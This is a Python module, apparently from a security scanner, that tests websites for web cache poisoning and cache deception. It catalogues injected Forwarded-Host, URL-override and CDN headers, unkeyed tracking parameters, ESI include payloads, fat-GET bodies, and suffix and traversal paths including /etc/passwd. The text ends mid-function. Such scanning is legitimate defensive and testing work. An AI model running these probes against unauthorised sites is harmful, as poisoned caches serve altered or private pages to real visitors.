# modules/cache_poisoning_probe.py
import re
import time
import uuid
import hashlib
import threading
import itertools
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ---------------------------------------------------------------------------
# Attack surface catalogue
# ---------------------------------------------------------------------------
#
# Cache poisoning works by injecting an unkeyed input that the cache
# ignores when storing but the backend reflects into the response.
# When a victim requests the same cache key, they receive the poisoned copy.
#
# Every technique below is a tuple:
#   (header_name, header_value_template, technique_label, family, severity)
#
# {canary} is substituted with a unique probe string per request so we can
# confirm reflection without ambiguity.
# ---------------------------------------------------------------------------

_UNKEYED_HEADER_TECHNIQUES: List[Tuple[str, str, str, str, str]] = [

    # ── Host header / port override ────────────────────────────────────────
    # Many caches key on Host but strip port; backends may reflect it raw.
    ("Host",                   "{target_host}:{canary_port}", "host-port-inject",        "host",     "high"),
    ("X-Forwarded-Host",       "{canary}.{target_host}",      "xfh-subdomain",            "host",     "critical"),
    ("X-Forwarded-Host",       "{canary}",                    "xfh-arbitrary",            "host",     "critical"),
    ("X-Host",                 "{canary}.{target_host}",      "xhost-subdomain",          "host",     "high"),
    ("X-Forwarded-Server",     "{canary}.{target_host}",      "xfwd-server",              "host",     "high"),
    ("X-Original-Host",        "{canary}.{target_host}",      "xoriginal-host",           "host",     "high"),
    ("Forwarded",              "host={canary}.{target_host}", "forwarded-host",           "host",     "high"),

    # ── Scheme override ───────────────────────────────────────────────────
    ("X-Forwarded-Proto",      "{canary}",                    "xfp-arbitrary",            "scheme",   "medium"),
    ("X-Forwarded-Scheme",     "{canary}",                    "xfs-arbitrary",            "scheme",   "medium"),
    ("X-Scheme",               "{canary}",                    "xscheme",                  "scheme",   "medium"),

    # ── Port override ─────────────────────────────────────────────────────
    ("X-Forwarded-Port",       "{canary_port}",               "xfp-port",                 "port",     "medium"),
    ("X-Original-Port",        "{canary_port}",               "xop-port",                 "port",     "medium"),

    # ── IP / origin override ──────────────────────────────────────────────
    ("X-Forwarded-For",        "{canary_ip}",                 "xff-ip",                   "ip",       "medium"),
    ("X-Real-IP",              "{canary_ip}",                 "xrealip",                  "ip",       "medium"),
    ("True-Client-IP",         "{canary_ip}",                 "true-client-ip",           "ip",       "medium"),
    ("CF-Connecting-IP",       "{canary_ip}",                 "cf-connecting-ip",         "ip",       "medium"),

    # ── URL / path override ───────────────────────────────────────────────
    # Some caches key on path but proxies rewrite from these headers.
    ("X-Original-URL",         "/cache-poison-{canary}",      "xoriginal-url",            "path",     "critical"),
    ("X-Rewrite-URL",          "/cache-poison-{canary}",      "xrewrite-url",             "path",     "critical"),
    ("X-Override-URL",         "/cache-poison-{canary}",      "xoverride-url",            "path",     "high"),
    ("X-Forwarded-Path",       "/cache-poison-{canary}",      "xfwd-path",               "path",     "high"),

    # ── Prefix / routing headers ──────────────────────────────────────────
    # Akamai, Fastly, Cloudflare, Varnish all have bespoke routing headers.
    ("Fastly-Orig-Host",       "{canary}.{target_host}",      "fastly-orig-host",         "cdn",      "high"),
    ("Surrogate-Capability",   "abc123=ESI/1.0",              "esi-capability",           "esi",      "high"),
    ("X-Akamai-Requeued",      "{canary}",                    "akamai-requeue",           "cdn",      "medium"),
    ("CDN-Loop",               "{canary}",                    "cdn-loop",                 "cdn",      "medium"),

    # ── Content negotiation (unkeyed in many CDNs) ────────────────────────
    ("Accept-Encoding",        "gzip,{canary}",               "accept-encoding-inject",   "content",  "medium"),
    ("Accept",                 "text/html,{canary}",          "accept-inject",            "content",  "low"),
    ("Accept-Language",        "en-US,{canary}",              "accept-lang-inject",       "content",  "low"),

    # ── Fat GET — body in GET request (some caches ignore body) ───────────
    # Handled separately — needs body injection, not header injection.

    # ── Pragma / cache-control manipulation ───────────────────────────────
    ("Pragma",                 "no-cache, {canary}",          "pragma-inject",            "cache",    "low"),
    ("Cache-Control",          "no-store, {canary}",          "cc-inject",                "cache",    "low"),

    # ── Misc reflected headers ─────────────────────────────────────────────
    ("X-Custom-Header",        "{canary}",                    "custom-header-reflect",    "misc",     "low"),
    ("X-HTTP-Method-Override", "{canary}",                    "method-override-reflect",  "misc",     "low"),
    ("Origin",                 "https://{canary}.{target_host}", "origin-reflect",        "cors",     "high"),
    ("Access-Control-Request-Headers", "{canary}",            "acr-headers-reflect",      "cors",     "low"),
]

# ── Parameter-based cache poisoning ───────────────────────────────────────
# Some caches include query params in the key but exclude UTM / tracking params.
_UNKEYED_PARAM_TECHNIQUES: List[Tuple[str, str, str]] = [
    # (param_name, label, severity)
    ("utm_source",        "utm-source-unkeyed",    "medium"),
    ("utm_medium",        "utm-medium-unkeyed",    "medium"),
    ("utm_campaign",      "utm-campaign-unkeyed",  "medium"),
    ("utm_content",       "utm-content-unkeyed",   "medium"),
    ("utm_term",          "utm-term-unkeyed",       "medium"),
    ("fbclid",            "fbclid-unkeyed",         "medium"),
    ("gclid",             "gclid-unkeyed",          "medium"),
    ("_ga",               "ga-unkeyed",             "medium"),
    ("ref",               "ref-unkeyed",            "low"),
    ("source",            "source-unkeyed",          "low"),
    ("callback",          "jsonp-callback",          "high"),
    ("jsonp",             "jsonp-unkeyed",           "high"),
    ("_",                 "timestamp-bypass",        "low"),
]

# ── ESI (Edge Side Includes) injection probes ─────────────────────────────
_ESI_PAYLOADS: List[Tuple[str, str, str]] = [
    # (payload, label, evidence_pattern)
    ('<esi:include src="http://canary.{target_host}/esi"/>',
     "esi-include", r"<esi:include"),
    ('<esi:debug/>',
     "esi-debug", r"<esi:debug"),
    ('<esi:vars name="$(HTTP_HOST)"/>',
     "esi-vars-host", r"<esi:vars"),
    ('<!--esi <esi:include src="http://canary.{target_host}/"/> -->',
     "esi-comment-include", r"esi:include"),
]

# ── Web cache deception probe paths ───────────────────────────────────────
# These target servers that cache based on file extension regardless of path.
_DECEPTION_SUFFIXES: List[Tuple[str, str]] = [
    ("/profile.css",      "deception-css"),
    ("/profile.js",       "deception-js"),
    ("/profile.png",      "deception-png"),
    ("/profile.jpg",      "deception-jpg"),
    ("/profile.ico",      "deception-ico"),
    ("/profile.woff",     "deception-woff"),
    ("/profile.svg",      "deception-svg"),
    ("/profile.gif",      "deception-gif"),
    ("/static/../profile","deception-traversal-css"),
    ("/assets/../../../../etc/passwd", "deception-traversal"),
]

# ── Cache-Control directive abuse ─────────────────────────────────────────
# Some intermediate caches honour client-sent Cache-Control directives
# that override origin Cache-Control, allowing a poisoner to extend TTL.
_CC_DIRECTIVES: List[Tuple[str, str, str]] = [
    # (directive, label, severity)
    ("max-age=31536000", "cc-max-age-year",    "medium"),
    ("s-maxage=31536000","cc-smaxage-year",    "medium"),
    ("no-store",          "cc-no-store",        "low"),
    ("public",            "cc-public-force",    "low"),
]

# Headers that CDNs / caches commonly include in responses to identify
# whether the response was served from cache or origin.
_CACHE_HIT_INDICATORS: List[Tuple[str, str]] = [
    ("X-Cache",          r"HIT"),
    ("X-Cache-Status",   r"HIT"),
    ("CF-Cache-Status",  r"HIT"),
    ("Age",              r"\d+"),
    ("X-Drupal-Cache",   r"HIT"),
    ("X-Varnish",        r"\d+\s+\d+"),    # two IDs → cache hit
    ("X-Served-By",      r".+"),
    ("Via",              r"(varnish|squid|nginx|cloudfront|fastly|akamai)"),
    ("Fastly-Debug-Digest", r".+"),
    ("X-Proxy-Cache",    r"HIT"),
]

_CACHE_MISS_INDICATORS: List[str] = [
    "MISS", "EXPIRED", "BYPASS", "DYNAMIC", "UNCACHEABLE",
]

_REFLECTION_ESCAPE_PATTERNS = [
    # HTML context
    re.compile(r"<[^>]*ARTEX[A-Z0-9]{8}[^>]*>", re.I),
    # JS context
    re.compile(r"[\"']ARTEX[A-Z0-9]{8}[\"']", re.I),
    # Header value reflected in body
    re.compile(r"ARTEX[A-Z0-9]{8}", re.I),
]


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class CacheProbeResult:
    technique_label: str
    technique_family: str
    severity: str
    target_url: str
    injected_header: Optional[str]
    injected_value: Optional[str]
    injected_param: Optional[str]
    canary: str
    # Phase A — poisoning request
    poison_status: int
    poison_cache_state: str         # HIT / MISS / UNKNOWN
    canary_reflected_in_poison: bool
    # Phase B — verification request (clean headers, same cache key)
    verify_status: Optional[int]
    verify_cache_state: str
    canary_reflected_in_verify: bool
    # Verdict
    poisoned: bool                   # True only when verify also reflects canary
    evidence: str
    response_diff_bytes: int         # size delta between poison and verify


@dataclass
class CacheFingerprint:
    """CDN / cache layer identification from response headers."""
    cache_layer: Optional[str]       # e.g. "Cloudflare", "Varnish", "Fastly"
    cache_hit_header: Optional[str]
    cache_hit_value: Optional[str]
    age_seconds: Optional[int]
    vary_headers: List[str]
    cache_control: Optional[str]
    surrogate_control: Optional[str]
    cdn_headers: Dict[str, str]


@dataclass
class ScanState:
    target_url: str
    target_host: str
    fingerprint: Optional[CacheFingerprint]
    results: List[CacheProbeResult] = field(default_factory=list)
    lock: threading.Lock = field(default_factory=threading.Lock)
    cacheable_endpoints: List[str] = field(default_factory=list)
    uncacheable_endpoints: List[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# HTTP session
# ---------------------------------------------------------------------------

def _build_session(proxy: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    retry = Retry(total=1, backoff_factor=0.3, status_forcelist=[])
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=20,
        pool_maxsize=40,
    )
    session.mount("https://", adapter)
    session.mount("http://",  adapter)
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"


def _req(
    session: requests.Session,
    method: str,
    url: str,
    extra_headers: Dict[str, str],
    params: Optional[Dict] = None,
    timeout: float = 8.0,
) -> Optional[requests.Response]:
    headers = {"User-Agent": _UA, **extra_headers}
    try:
        return session.request(
            method, url,
            headers=headers,
            params=params,
            timeout=timeout,
            allow_redirects=False,
        )
    except requests.RequestException:
        return None


# ---------------------------------------------------------------------------
# Canary generation
# ---------------------------------------------------------------------------

def _new_canary() -> str:
    """8-char uppercase hex string — unique per probe, easy to regex-match."""
    return "ARTEX" + uuid.uuid4().hex[:8].upper()


def _canary_port() -> str:
    """Port that is visually obviously injected but not a real service."""
    return str(19999 + (int(uuid.uuid4().hex[:4], 16) % 10000))


def _canary_ip() -> str:
    return f"203.0.113.{int(uuid.uuid4().hex[:2], 16) % 254 + 1}"  # TEST-NET-3


# ---------------------------------------------------------------------------
# Cache fingerprinting
# ---------------------------------------------------------------------------

_CDN_SIGNATURES: List[Tuple[str, str]] = [
    # (header_name_pattern, cdn_label)
    ("CF-Cache-Status",        "Cloudflare"),
    ("CF-Ray",                 "Cloudflare"),
    ("X-Served-By",            "Fastly"),
    ("Fastly-Debug-Digest",    "Fastly"),
    ("X-Cache",                "Generic/Varnish"),
    ("X-Varnish",              "Varnish"),
    ("X-Cache-Status",         "Nginx/Kong"),
    ("X-Amz-Cf-Id",            "CloudFront"),
    ("X-Amz-Cf-Pop",           "CloudFront"),
    ("X-Cache-Hits",           "Varnish/HAProxy"),
    ("X-Drupal-Cache",         "Drupal"),
    ("X-WP-Super-Cache",       "WordPress SuperCache"),
    ("X-LiteSpeed-Cache",      "LiteSpeed"),
    ("Akamai-Cache-Status",    "Akamai"),
    ("X-Check-Cacheable",      "Akamai"),
    ("X-Azure-Ref",            "Azure CDN"),
]


def _fingerprint_cache(resp: requests.Response) -> CacheFingerprint:
    """Identify the caching layer from response headers."""
    cache_layer: Optional[str] = None
    hit_header: Optional[str] = None
    hit_value: Optional[str] = None
    cdn_headers: Dict[str, str] = {}

    for header, label in _CDN_SIGNATURES:
        val = resp.headers.get(header, "")
        if val:
            cdn_headers[header] = val
            if not cache_layer:
                cache_layer = label
            if not hit_header and re.search(r"HIT|MISS|BYPASS", val, re.I):
                hit_header = header
                hit_value  = val

    # Age header
    age_raw = resp.headers.get("Age", "")
    age_seconds: Optional[int] = None
    try:
        age_seconds = int(age_raw) if age_raw else None
    except ValueError:
        pass

    # Vary
    vary = [v.strip() for v in resp.headers.get("Vary", "").split(",") if v.strip()]

    return CacheFingerprint(
        cache_layer=cache_layer,
        cache_hit_header=hit_header,
        cache_hit_value=hit_value,
        age_seconds=age_seconds,
        vary_headers=vary,
        cache_control=resp.headers.get("Cache-Control"),
        surrogate_control=resp.headers.get("Surrogate-Control"),
        cdn_headers=cdn_headers,
    )


def _cache_state(resp: requests.Response) -> str:
    """Return HIT / MISS / UNKNOWN from response headers."""
    for header, pattern in _CACHE_HIT_INDICATORS:
        val = resp.headers.get(header, "")
        if re.search(pattern, val, re.I):
            if any(m in val.upper() for m in _CACHE_MISS_INDICATORS):
                return "MISS"
            return "HIT"
    return "UNKNOWN"


# ---------------------------------------------------------------------------
# Cacheable endpoint discovery
# ---------------------------------------------------------------------------

_STATIC_EXTENSION_RE = re.compile(
    r"\.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|map|json|xml|txt)$",
    re.I
)

_DYNAMIC_CONTENT_TYPES = {
    "text/html", "application/json", "application/xml",
    "text/xml", "application/javascript",
}

_PROBE_PATHS = [
    "/", "/index.html", "/index.php",
    "/static/main.css", "/assets/app.js",
    "/api/v1/status", "/api/status", "/health",
    "/robots.txt", "/sitemap.xml",
    "/login", "/admin", "/dashboard",
]


def _discover_cacheable_endpoints(
    session: requests.Session,
    base_url: str,
    timeout: float,
) -> Tuple[List[str], List[str]]:
    """
    Probe common paths twice with identical requests.
    An endpoint is "cacheable" when:
      - Both responses have identical body hashes (stable content)
      - Response includes a Cache-Control or Age header permitting caching
      - OR response shows a HIT on second request
    Returns (cacheable, uncacheable) URL lists.
    """
    cacheable: List[str] = []
    uncacheable: List[str] = []

    def _probe_pair(path: str) -> Optional[Tuple[str, bool]]:
        url = base_url.rstrip("/") + path
        r1 = _req(session, "GET", url, {}, timeout=timeout)
        if not r1 or r1.status_code in (404, 410, 400):
            return None
        time.sleep(0.3)
        r2 = _req(session, "GET", url, {}, timeout=timeout)
        if not r2:
            return None

        h1 = hashlib.md5(r1.content).hexdigest()
        h2 = hashlib.md5(r2.content).hexdigest()
        stable = (h1 == h2)

        cc = r2.headers.get("Cache-Control", "")
        has_cache_header = bool(
            r2.headers.get("Age") or
            re.search(r"(max-age|s-maxage|public)", cc, re.I)
        )
        is_cacheable = stable and (
            has_cache_header or
            _cache_state(r2) == "HIT" or
            bool(_STATIC_EXTENSION_RE.search(path))
        )
        return (url, is_cacheable)

    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = {ex.submit(_probe_pair, p): p for p in _PROBE_PATHS}
        for f in as_completed(futures):
            r = f.result()
            if r is None:
                continue
            url, is_cache = r
            (cacheable if is_cache else uncacheable).append(url)

    return cacheable, uncacheable


# ---------------------------------------------------------------------------
# Reflection detection
# ---------------------------------------------------------------------------

def _canary_in_body(body: str, canary: str) -> bool:
    return canary.upper() in body.upper()


def _canary_in_headers(resp: requests.Response, canary: str) -> bool:
    for val in resp.headers.values():
        if canary.upper() in val.upper():
            return True
    return False


def _body_hash(resp: requests.Response) -> str:
    return hashlib.md5(resp.content).hexdigest()


# ---------------------------------------------------------------------------
# Phase 1 — Header injection probes
# ---------------------------------------------------------------------------

def _build_header_value(
    template: str,
    canary: str,
    target_host: str,
) -> str:
    return (template
            .replace("{canary}",        canary)
            .replace("{canary_port}",   _canary_port())
            .replace("{canary_ip}",     _canary_ip())
            .replace("{target_host}",   target_host))


def _probe_header_technique(
    session: requests.Session,
    endpoint_url: str,
    target_host: str,
    header_name: str,
    value_template: str,
    label: str,
    family: str,
    severity: str,
    timeout: float,
    rate_delay: float,
) -> Optional[CacheProbeResult]:
    """
    Two-phase probe:
      Phase A — send request with injected header; check if canary reflects.
      Phase B — send clean request to same URL; check if poisoned cache serves
                the canary back.

    A confirmed poison requires the canary to appear in Phase B's response
    WITHOUT the injection header being present.
    """
    canary = _new_canary()
    injected_value = _build_header_value(value_template, canary, target_host)

    # ── Phase A — poison request ───────────────────────────────────────────
    if rate_delay > 0:
        time.sleep(rate_delay)

    extra = {header_name: injected_value}
    # For Host header probes, we must set it differently (requests handles Host)
    if header_name.lower() == "host":
        resp_a = _req(session, "GET", endpoint_url,
                      {"User-Agent": _UA},
                      timeout=timeout)
        # Workaround: inject via prepared request to override Host
        try:
            req = requests.Request("GET", endpoint_url, headers={"Host": injected_value, "User-Agent": _UA})
            prep = req.prepare()
            prep.headers["Host"] = injected_value
            resp_a = session.send(prep, timeout=timeout, allow_redirects=False)
        except Exception:
            return None
    else:
        resp_a = _req(session, "GET", endpoint_url, extra, timeout=timeout)

    if resp_a is None:
        return None

    cache_a      = _cache_state(resp_a)
    reflected_a  = (
        _canary_in_body(resp_a.text, canary) or
        _canary_in_headers(resp_a, canary)
    )

    # No reflection in Phase A → not injectable, skip Phase B
    if not reflected_a:
        return None

    # ── Phase B — verify request (clean headers, same cache key) ──────────
    time.sleep(0.5)   # allow cache to store the poisoned entry
    resp_b = _req(session, "GET", endpoint_url, {}, timeout=timeout)
    if resp_b is None:
        return None

    cache_b     = _cache_state(resp_b)
    reflected_b = (
        _canary_in_body(resp_b.text, canary) or
        _canary_in_headers(resp_b, canary)
    )

    poisoned = reflected_b and cache_b in ("HIT", "UNKNOWN")

    size_delta = abs(len(resp_a.content) - len(resp_b.content))

    evidence_parts = [f"Phase-A: {resp_a.status_code}/{cache_a}"]
    if reflected_a:
        evidence_parts.append("canary reflected in poison response")
    evidence_parts.append(f"Phase-B: {resp_b.status_code}/{cache_b}")
    if reflected_b:
        evidence_parts.append("canary PERSISTS in clean response (POISONED)")

    return CacheProbeResult(
        technique_label=label,
        technique_family=family,
        severity=severity if poisoned else "info",
        target_url=endpoint_url,
        injected_header=header_name,
        injected_value=injected_value,
        injected_param=None,
        canary=canary,
        poison_status=resp_a.status_code,
        poison_cache_state=cache_a,
        canary_reflected_in_poison=reflected_a,
        verify_status=resp_b.status_code,
        verify_cache_state=cache_b,
        canary_reflected_in_verify=reflected_b,
        poisoned=poisoned,
        evidence=" | ".join(evidence_parts),
        response_diff_bytes=size_delta,
    )


# ---------------------------------------------------------------------------
# Phase 2 — Unkeyed parameter probes
# ---------------------------------------------------------------------------

def _probe_param_technique(
    session: requests.Session,
    endpoint_url: str,
    param_name: str,
    label: str,
    severity: str,
    timeout: float,
    rate_delay: float,
) -> Optional[CacheProbeResult]:
    """
    Inject a unique canary as the value of a potentially unkeyed query param.
    If the cache stores the response without keying on the param, a clean
    request to the base URL will reflect the canary.
    """
    canary = _new_canary()

    if rate_delay > 0:
        time.sleep(rate_delay)

    # Phase A — with param
    resp_a = _req(session, "GET", endpoint_url, {},
                  params={param_name: canary}, timeout=timeout)
    if not resp_a:
        return None

    cache_a     = _cache_state(resp_a)
    reflected_a = _canary_in_body(resp_a.text, canary)
    if not reflected_a:
        return None

    # Phase B — without param (same cache key if param is truly unkeyed)
    time.sleep(0.5)
    resp_b = _req(session, "GET", endpoint_url, {}, timeout=timeout)
    if not resp_b:
        return None

    cache_b     = _cache_state(resp_b)
    reflected_b = _canary_in_body(resp_b.text, canary)
    poisoned    = reflected_b

    return CacheProbeResult(
        technique_label=label,
        technique_family="param",
        severity=severity if poisoned else "info",
        target_url=endpoint_url,
        injected_header=None,
        injected_value=None,
        injected_param=f"{param_name}={canary}",
        canary=canary,
        poison_status=resp_a.status_code,
        poison_cache_state=cache_a,
        canary_reflected_in_poison=reflected_a,
        verify_status=resp_b.status_code,
        verify_cache_state=cache_b,
        canary_reflected_in_verify=reflected_b,
        poisoned=poisoned,
        evidence=(
            f"param '{param_name}' reflected in Phase-A"
            + (" and PERSISTS in Phase-B (POISONED)" if poisoned else " but NOT in Phase-B")
        ),
        response_diff_bytes=abs(len(resp_a.content) - len(resp_b.content)),
    )


# ---------------------------------------------------------------------------
# Phase 3 — ESI injection probes
# ---------------------------------------------------------------------------

def _probe_esi(
    session: requests.Session,
    endpoint_url: str,
    target_host: str,
    timeout: float,
    rate_delay: float,
) -> List[CacheProbeResult]:
    """
    Inject ESI directives via request bodies or headers.
    ESI is processed by some CDN edge nodes before the response reaches
    the client; a successful injection would cause the edge to make
    outbound requests or disclose internal variables.
    """
    results: List[CacheProbeResult] = []

    for payload_template, label, evidence_pattern in _ESI_PAYLOADS:
        canary   = _new_canary()
        payload  = payload_template.replace("{target_host}", target_host)

        if rate_delay > 0:
            time.sleep(rate_delay)

        # Inject via X-Forwarded-Host (common vector) + body for POST
        resp_a = _req(
            session, "GET", endpoint_url,
            {"Surrogate-Capability": f"{canary}=ESI/1.0",
             "X-ESI-Payload": payload},
            timeout=timeout,
        )
        if not resp_a:
            continue

        reflected = re.search(evidence_pattern, resp_a.text, re.I)
        if not reflected:
            continue

        results.append(CacheProbeResult(
            technique_label=label,
            technique_family="esi",
            severity="high",
            target_url=endpoint_url,
            injected_header="Surrogate-Capability / X-ESI-Payload",
            injected_value=payload[:80],
            injected_param=None,
            canary=canary,
            poison_status=resp_a.status_code,
            poison_cache_state=_cache_state(resp_a),
            canary_reflected_in_poison=True,
            verify_status=None,
            verify_cache_state="N/A",
            canary_reflected_in_verify=False,
            poisoned=False,     # ESI reflection is a potential, not a confirmed poison
            evidence=f"ESI directive reflected: {reflected.group(0)[:60]}",
            response_diff_bytes=0,
        ))

    return results


# ---------------------------------------------------------------------------
# Phase 4 — Web cache deception
# ---------------------------------------------------------------------------

def _probe_cache_deception(
    session: requests.Session,
    base_url: str,
    authenticated_path: str,
    timeout: float,
    rate_delay: float,
) -> List[CacheProbeResult]:
    """
    Append static-looking suffixes to dynamic/authenticated paths.
    If the cache serves the authenticated response to any subsequent
    unauthenticated request for the same URL, the endpoint is vulnerable.

    Two-step: poison (authenticated), verify (clean session, same URL).
    In this passive probe we detect whether the response is cached at all,
    which is a prerequisite for exploitation.
    """
    results: List[CacheProbeResult] = []

    for suffix, label in _DECEPTION_SUFFIXES:
        url = base_url.rstrip("/") + authenticated_path.rstrip("/") + suffix

        if rate_delay > 0:
            time.sleep(rate_delay)

        resp_a = _req(session, "GET", url, {}, timeout=timeout)
        if not resp_a or resp_a.status_code in (404, 400, 410):
            continue

        cache_a = _cache_state(resp_a)
        cc = resp_a.headers.get("Cache-Control", "")

        # Vulnerable if the server returns the dynamic content AND
        # it appears cacheable (CDN HIT or no no-store/private directive)
        is_dynamic = (
            resp_a.headers.get("Content-Type", "").split(";")[0].strip()
            in _DYNAMIC_CONTENT_TYPES
        )
        no_store   = bool(re.search(r"no-store|private", cc, re.I))
        cacheable  = cache_a == "HIT" or (not no_store and resp_a.status_code == 200)

        if is_dynamic and cacheable:
            results.append(CacheProbeResult(
                technique_label=label,
                technique_family="deception",
                severity="high",
                target_url=url,
                injected_header=None,
                injected_value=None,
                injected_param=suffix,
                canary="N/A",
                poison_status=resp_a.status_code,
                poison_cache_state=cache_a,
                canary_reflected_in_poison=False,
                verify_status=None,
                verify_cache_state="N/A",
                canary_reflected_in_verify=False,
                poisoned=False,     # requires authenticated session to confirm
                evidence=(
                    f"Dynamic content ({resp_a.headers.get('Content-Type','?')}) "
                    f"served at static-looking path and appears cacheable "
                    f"(Cache-Control: {cc!r}, cache state: {cache_a})"
                ),
                response_diff_bytes=0,
            ))

    return results


# ---------------------------------------------------------------------------
# Phase 5 — Fat GET probe
# ---------------------------------------------------------------------------

def _probe_fat_get(
    session: requests.Session,
    endpoint_url: str,
    timeout: float,
    rate_delay: float,
) -> Optional[CacheProbeResult]:
    """
    Send a GET request with a body. Some caches key only on
    URL+headers and ignore the body, while some backends read
    body params from GET requests — classic cache poisoning vector.
    """
    canary = _new_canary()
    body   = f"poison_param={canary}"

    if rate_delay > 0:
        time.sleep(rate_delay)

    try:
        resp_a = session.request(
            "GET", endpoint_url,
            headers={
                "User-Agent":    _UA,
                "Content-Type":  "application/x-www-form-urlencoded",
                "Content-Length": str(len(body)),
            },
            data=body,
            timeout=timeout,
            allow_redirects=False,
        )
    except requests.RequestException:
        return None

    cache_a    = _cache_state(resp_a)
    reflected  = _canary_in_body(resp_a.text, canary)
    if not reflected:
        return None

    time.sleep(0.5)
    resp_b = _req(session, "GET", endpoint_url, {}, timeout=timeout)
    if not resp_b:
        return None

    cache_b    = _cache_state(resp_b)
    reflected_b = _canary_in_body(resp_b.text, canary)

    return CacheProbeResult(
        technique_label="fat-get-body",
        technique_family="fat_get",
        severity="high" if reflected_b else "info",
        target_url=endpoint_url,
        injected_header="Content-Type",
        injected_value=body[:60],
        injected_param=None,
        canary=canary,
        poison_status=resp_a.status_code,
        poison_cache_state=cache_a,
        canary_reflected_in_poison=reflected,
        verify_status=resp_b.status_code,
        verify_cache_state=cache_b,
        canary_reflected_in_verify=reflected_b,
        poisoned=reflected_b,
        evidence=(
            f"GET body reflected in Phase-A"
            + (" — PERSISTS in clean Phase-B (POISONED)" if reflected_b else "")
        ),
        response_diff_bytes=abs(len(resp_a.content) - len(resp_b.content)),
    )


# ---------------------------------------------------------------------------
# Severity ordering / deduplication
# ---------------------------------------------------------------------------

_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def _dedup_sort(results: List[CacheProbeResult]) -> List[CacheProbeResult]:
    seen: Set[Tuple] = set()
    unique: List[CacheProbeResult] = []
    for r in results:
        key = (r.target_url, r.technique_label, r.canary)
        if key not in seen:
            seen.add(key)
            unique.append(r)
    unique.sort(key=lambda r: (
        0 if r.poisoned else 1,
        _SEV_ORDER.get(r.severity, 9),
        r.technique_label,
    ))
    return unique


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

class CachePoisoningProbe:
    """
    Web cache poisoning & deception probe.

    Five attack phases:
      1. Unkeyed HTTP header injection (35 header techniques)
      2. Unkeyed query parameter injection (13 param techniques)
      3. ESI (Edge Side Includes) injection detection
      4. Web cache deception (static-suffix path tricks)
      5. Fat GET body injection

    Each technique runs a two-phase probe: poison then verify.
    Only a confirmed reflection in Phase B (clean request, same cache key)
    is flagged as poisoned=True.

    Usage in app.py:
        probe = CachePoisoningProbe(target_url=f"https://{domain}")
        results = probe.scan()
        scan_results[scan_id]['cache_poisoning'] = results
    """

    def __init__(
        self,
        target_url: str,
        extra_endpoints: Optional[List[str]] = None,
        authenticated_paths: Optional[List[str]] = None,
        timeout: float = 8.0,
        max_workers: int = 10,
        rate_delay: float = 0.3,
        proxy: Optional[str] = None,
        skip_families: Optional[List[str]] = None,
    ):
        self.target_url          = target_url.rstrip("/")
        self.extra_endpoints     = extra_endpoints or []
        self.authenticated_paths = authenticated_paths or ["/profile", "/account", "/dashboard"]
        self.timeout             = timeout
        self.max_workers         = max_workers
        self.rate_delay          = rate_delay
        self.proxy               = proxy
        self.skip_families       = set(skip_families or [])

        from urllib.parse import urlparse
        parsed = urlparse(self.target_url)
        self.target_host = parsed.hostname or self.target_url

    # ------------------------------------------------------------------
    # Public scan
    # ------------------------------------------------------------------

    def scan(self) -> Dict:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        session = _build_session(self.proxy)

        print(f"[cache_poison] target  : {self.target_url}")

        # ── Fingerprint ────────────────────────────────────────────────────
        resp0 = _req(session, "GET", self.target_url, {}, timeout=self.timeout)
        fingerprint = _fingerprint_cache(resp0) if resp0 else None
        if fingerprint:
            print(
                f"[cache_poison] CDN     : {fingerprint.cache_layer or 'unknown'} | "
                f"Vary: {fingerprint.vary_headers}"
            )

        # ── Endpoint discovery ─────────────────────────────────────────────
        cacheable, uncacheable = _discover_cacheable_endpoints(
            session, self.target_url, self.timeout
        )
        cacheable = list(dict.fromkeys(cacheable + self.extra_endpoints))
        print(f"[cache_poison] cacheable endpoints: {len(cacheable)}")

        state = ScanState(
            target_url=self.target_url,
            target_host=self.target_host,
            fingerprint=fingerprint,
            cacheable_endpoints=cacheable,
            uncacheable_endpoints=uncacheable,
        )

        all_results: List[CacheProbeResult] = []
        lock = threading.Lock()

        # ── Phase 1: header techniques (parallel across endpoints × techniques)
        if "header" not in self.skip_families:
            header_tasks = list(itertools.product(
                cacheable[:5],           # top 5 cacheable endpoints
                _UNKEYED_HEADER_TECHNIQUES,
            ))
            print(f"[cache_poison] phase 1: {len(header_tasks)} header probes")

            with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
                futures = {
                    ex.submit(
                        _probe_header_technique,
                        session, endpoint, self.target_host,
                        hdr, val, label, family, severity,
                        self.timeout, self.rate_delay,
                    ): (endpoint, label)
                    for endpoint, (hdr, val, label, family, severity) in header_tasks
                }
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        with lock:
                            all_results.append(r)
                        flag = "POISONED" if r.poisoned else "reflect"
                        print(
                            f"  [{flag}][{r.severity.upper():<8}] "
                            f"{r.technique_label} @ {r.target_url}"
                        )

        # ── Phase 2: param techniques ──────────────────────────────────────
        if "param" not in self.skip_families:
            param_tasks = list(itertools.product(
                cacheable[:5],
                _UNKEYED_PARAM_TECHNIQUES,
            ))
            print(f"[cache_poison] phase 2: {len(param_tasks)} param probes")

            with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
                futures = {
                    ex.submit(
                        _probe_param_technique,
                        session, endpoint, param, label, severity,
                        self.timeout, self.rate_delay,
                    ): (endpoint, label)
                    for endpoint, (param, label, severity) in param_tasks
                }
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        with lock:
                            all_results.append(r)

        # ── Phase 3: ESI injection ─────────────────────────────────────────
        if "esi" not in self.skip_families:
            print(f"[cache_poison] phase 3: ESI injection probes")
            for endpoint in cacheable[:3]:
                esi_results = _probe_esi(
                    session, endpoint, self.target_host,
